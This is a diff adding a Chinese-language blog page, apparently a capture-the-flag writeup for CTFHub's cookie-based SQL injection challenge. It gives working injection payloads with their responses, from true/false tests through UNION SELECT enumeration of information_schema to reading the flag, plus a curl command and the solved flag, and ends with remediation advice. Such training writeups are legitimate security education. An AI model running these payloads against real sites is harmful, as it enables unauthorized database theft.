@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CTFHub Cookie注入 Writeup - gz2008的技术博客</title>
+    <style>
+        body { background: #f6f9fc; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", sans-serif; color: #1e293b; line-height: 1.8; padding: 40px 20px; display: flex; justify-content: center; }
+        .container { max-width: 800px; width: 100%; background: #ffffff; border-radius: 20px; box-shadow: 0 10px 30px rgba(0, 0, 0, 0.05); padding: 40px; }
+        .back-link { display: inline-block; margin-bottom: 20px; color: #3b82f6; text-decoration: none; font-weight: 500; }
+        .back-link:hover { text-decoration: underline; }
+        h1 { font-size: 2rem; color: #0f172a; margin-bottom: 10px; border-bottom: 2px solid #eef2f6; padding-bottom: 15px; }
+        .tags { margin-bottom: 25px; }
+        .tag { display: inline-block; background: #eff6ff; color: #2563eb; padding: 4px 12px; border-radius: 20px; font-size: 0.85rem; margin-right: 8px; margin-bottom: 8px; font-weight: 500; }
+        h2 { font-size: 1.4rem; color: #1e293b; margin-top: 30px; margin-bottom: 15px; border-left: 4px solid #3b82f6; padding-left: 10px; }
+        p { margin-bottom: 15px; color: #475569; }
+        ul, ol { margin-left: 20px; margin-bottom: 15px; color: #475569; }
+        li { margin-bottom: 8px; }
+        code { background: #f1f5f9; padding: 2px 6px; border-radius: 4px; font-family: Consolas, monospace; color: #e11d48; font-size: 0.9em; }
+        pre { background: #1e293b; color: #e2e8f0; padding: 15px; border-radius: 8px; overflow-x: auto; font-family: Consolas, monospace; font-size: 0.9em; line-height: 1.6; }
+        .flag-box { background: #f0fdf4; border: 1px solid #bbf7d0; color: #166534; padding: 15px; border-radius: 10px; font-weight: 700; font-size: 1.1rem; text-align: center; font-family: Consolas, monospace; margin: 20px 0; word-break: break-all; }
+        .note { background: #fff7ed; border-left: 4px solid #f97316; padding: 12px 16px; border-radius: 6px; color: #9a3412; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <a href="index.html" class="back-link">&larr; 返回 CTFHub 首页</a>
+
+        <h1>CTFHub - Web - SQL注入 - Cookie注入</h1>
+
+        <div class="tags">
+            <span class="tag"># CTFHub</span>
+            <span class="tag"># Web</span>
+            <span class="tag"># SQL注入</span>
+            <span class="tag"># Cookie注入</span>
+            <span class="tag"># UNION注入</span>
+        </div>
+
+        <h2>一、题目信息</h2>
+        <ul>
+            <li><strong>题目名称：</strong>Cookie注入</li>
+            <li><strong>题目方向：</strong>Web - SQL注入</li>
+            <li><strong>题目环境：</strong>动态分配的 HTTP 服务地址</li>
+            <li><strong>题目目标：</strong>从 Cookie 注入点读取数据库中的 flag。</li>
+        </ul>
+
+        <h2>二、定位注入点</h2>
+        <p>首次访问页面时，服务器明确下发了名为 <code>id</code> 的 Cookie：</p>
+        <pre>HTTP/1.1 200 OK
+Set-Cookie: id=1
+Set-Cookie: hint=id输入1试试？</pre>
+        <p>携带 <code>id=1</code> 请求后，页面回显实际执行的 SQL 和查询结果：</p>
+        <pre>select * from news where id=1
+
+ID: 1
+Data: ctfhub</pre>
+        <p>修改 Cookie 为 <code>id=2</code> 后返回另一条数据，说明 Cookie 值直接进入了服务端 SQL 查询，而不是只用于标识当前身份。</p>
+
+        <h2>三、确认 SQL 注入</h2>
+        <p>由于 <code>id</code> 两侧没有单引号，先按数字型注入验证真假条件：</p>
+        <pre>Cookie: id=1 and 1=1
+
+ID: 1
+Data: ctfhub</pre>
+        <pre>Cookie: id=1 and 1=2
+
+无查询结果</pre>
+        <p>条件为真时正常返回，条件为假时无数据，可以确认 <code>id</code> Cookie 存在数字型 SQL 注入。</p>
+        <p class="note">Cookie 与 URL 参数、POST 参数一样都属于客户端输入，服务端若不校验便拼接进 SQL，同样会产生注入漏洞。</p>
+
+        <h2>四、确定查询列数</h2>
+        <p>使用 <code>order by</code> 判断原查询列数：<code>order by 2</code> 正常返回，<code>order by 3</code> 无结果，因此共有两列。</p>
+        <p>再使用不存在的 <code>id=-1</code> 让 UNION 查询结果优先回显：</p>
+        <pre>Cookie: id=-1 union select 1,2
+
+ID: 1
+Data: 2</pre>
+        <p>两个列位都可以回显。后续将辅助信息放在第一列，将目标数据放在第二列。</p>
+
+        <h2>五、获取数据库基本信息</h2>
+        <pre>Cookie: id=-1 union select version(),database()
+
+ID: 10.3.22-MariaDB-0+deb10u1
+Data: sqli</pre>
+        <p>目标数据库为 <code>sqli</code>，数据库类型为 MariaDB。下一步通过 <code>information_schema</code> 枚举表名和字段名。</p>
+
+        <h2>六、枚举表和字段</h2>
+        <p>查询当前数据库中的全部表名：</p>
+        <pre>Cookie: id=-1 union select 1,group_concat(table_name)
+from information_schema.tables
+where table_schema=database()
+
+ID: 1
+Data: jeeyegykwx,news</pre>
+        <p>除业务表 <code>news</code> 外，还存在随机表名 <code>jeeyegykwx</code>。继续查询该表的字段：</p>
+        <pre>Cookie: id=-1 union select 1,group_concat(column_name)
+from information_schema.columns
+where table_schema=database()
+and table_name='jeeyegykwx'
+
+ID: 1
+Data: knbolfmpwt</pre>
+        <p>目标数据位于 <code>jeeyegykwx.knbolfmpwt</code>。随机名称会随题目环境重新分配，实际解题时以当前查询结果为准。</p>
+
+        <h2>七、读取 Flag</h2>
+        <pre>Cookie: id=-1 union select 1,group_concat(knbolfmpwt)
+from jeeyegykwx
+
+ID: 1
+Data: ctfhub{8b3ee50ea5bbe9c22dff1a30}</pre>
+        <p>使用 <code>curl</code> 复现完整请求：</p>
+        <pre>curl.exe -H "Cookie: id=-1 union select 1,group_concat(knbolfmpwt) from jeeyegykwx" "http://&lt;target&gt;/"</pre>
+
+        <h2>八、最终 Flag</h2>
+        <div class="flag-box">
+            ctfhub{8b3ee50ea5bbe9c22dff1a30}
+        </div>
+
+        <h2>九、修复建议</h2>
+        <ul>
+            <li>使用预处理语句和参数绑定，禁止将 Cookie 值直接拼接进 SQL 语句。</li>
+            <li>对 <code>id</code> 等参数执行严格的整数类型校验，只接受合法数字。</li>
+            <li>生产环境关闭 SQL 语句回显和详细数据库错误信息。</li>
+            <li>数据库账号遵循最小权限原则，限制对 <code>information_schema</code> 和业务表的访问。</li>
+            <li>Cookie 完全由客户端控制，不能将其中的用户输入视为可信数据。</li>
+        </ul>
+
+        <h2>十、解题总结</h2>
+        <p>本题的变化点是注入参数从 URL 转移到了 Cookie。识别出 <code>id</code> Cookie 被直接拼接到 SQL 后，仍可沿用数字型注入的常规流程：真假如条件判断、<code>order by</code> 判断列数、<code>union select</code> 回显、枚举数据库结构，最后读取目标字段。</p>
+    </div>
+</body>
+</html>
